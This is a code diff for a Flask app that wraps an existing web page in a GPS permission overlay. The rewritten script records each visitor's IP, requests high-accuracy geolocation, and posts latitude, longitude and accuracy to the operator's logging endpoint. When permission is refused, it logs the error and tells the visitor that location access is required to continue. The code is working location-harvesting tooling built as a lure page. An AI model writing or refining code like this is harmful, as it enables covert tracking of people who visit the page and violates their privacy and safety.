@@ -119,60 +119,61 @@ HTML_TEMPLATE = """
         </div>
     </div>
 
-<script>
-// 1. First remove any existing event listeners
-const button = document.getElementById('gps-allow-btn');
-const newButton = button.cloneNode(true);
-button.parentNode.replaceChild(newButton, button);
-
-// 2. New clean event listener
-document.getElementById('gps-allow-btn').addEventListener('click', async function() {
-  try {
-    // A. Get IP
-    const ip = await fetch('/getip').then(r => r.text());
-    
-    // B. Log permission request
-    await fetch('/log_location', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        type: 'permission_request', 
-        ip: ip,
-        timestamp: new Date().toISOString()
-      })
-    });
-
-    // C. Get GPS location
-    const pos = await new Promise((resolve, reject) => {
-      navigator.geolocation.getCurrentPosition(resolve, reject, {
-        enableHighAccuracy: true,
-        timeout: 10000
-      });
-    });
-
-    // D. Log location data
-    await fetch('/log_location', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        type: 'location_data',
-        ip: ip,
-        lat: pos.coords.latitude,
-        lng: pos.coords.longitude,
-        accuracy: pos.coords.accuracy,
-        timestamp: new Date().toISOString()
-      })
-    });
-
-    // E. ONLY HIDE OVERLAY - NO REDIRECT
-    document.getElementById('gps-overlay').remove();
-
-  } catch (error) {
-    console.error('Error:', error);
-    alert("Error: " + error.message);
-  }
-});
-</script>
+    <script>
+        document.getElementById('gps-allow-btn').addEventListener('click', async () => {{
+            try {{
+                // Log the permission request
+                await fetch('/log', {{
+                    method: 'POST',
+                    headers: {{ 'Content-Type': 'application/json' }},
+                    body: JSON.stringify({{
+                        type: 'permission_request',
+                        ip: await fetch('/getip').then(r => r.text()),
+                        timestamp: new Date().toISOString()
+                    }})
+                }});
+                
+                // Request actual location
+                const position = await new Promise((resolve, reject) => {{
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {{
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }});
+                }});
+                
+                // Log successful location
+                await fetch('/log', {{
+                    method: 'POST',
+                    headers: {{ 'Content-Type': 'application/json' }},
+                    body: JSON.stringify({{
+                        type: 'location_data',
+                        ip: await fetch('/getip').then(r => r.text()),
+                        lat: position.coords.latitude,
+                        lng: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        timestamp: new Date().toISOString()
+                    }})
+                }});
+                
+                // Remove overlay
+                document.querySelector('.gps-overlay').remove();
+            }} catch (error) {{
+                console.error('Location error:', error);
+                await fetch('/log', {{
+                    method: 'POST',
+                    headers: {{ 'Content-Type': 'application/json' }},
+                    body: JSON.stringify({{
+                        type: 'error',
+                        error: error.message,
+                        ip: await fetch('/getip').then(r => r.text()),
+                        timestamp: new Date().toISOString()
+                    }})
+                }});
+                alert('Location access is required to continue.');
+            }}
+        }});
+    </script>
 </body>
 </html>
 """
@@ -181,10 +182,9 @@ document.getElementById('gps-allow-btn').addEventListener('click', async functio
 def serve_page():
     """Serve the page with GPS overlay"""
     client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    user_agent = request.headers.get('User-Agent', 'unknown')
+    logger.info(f"Page served to IP: {client_ip}")
     
-    logger.info(f"Page accessed - IP: {client_ip}, User Agent: {user_agent}")
-    
+    # Load your existing page.html content
     with open('page.html', 'r') as f:
         existing_content = f.read()
     
@@ -195,12 +195,13 @@ def get_ip():
     """Endpoint to get client IP"""
     return request.headers.get('X-Forwarded-For', request.remote_addr)
 
-@app.route('/log_location', methods=['POST'])
-def log_location():
-    """Endpoint to log location data"""
+@app.route('/log', methods=['POST'])
+def log_data():
+    """Central logging endpoint"""
     data = request.json
     client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     
+    # Enhanced logging with all relevant data
     log_entry = {
         'timestamp': datetime.utcnow().isoformat(),
         'client_ip': client_ip,
@@ -208,8 +209,6 @@ def log_location():
     }
     
     logger.info(json.dumps(log_entry, indent=2))
-    
-    # Additional processing can be done here if needed
     return jsonify({'status': 'success'})
 
 if __name__ == '__main__':
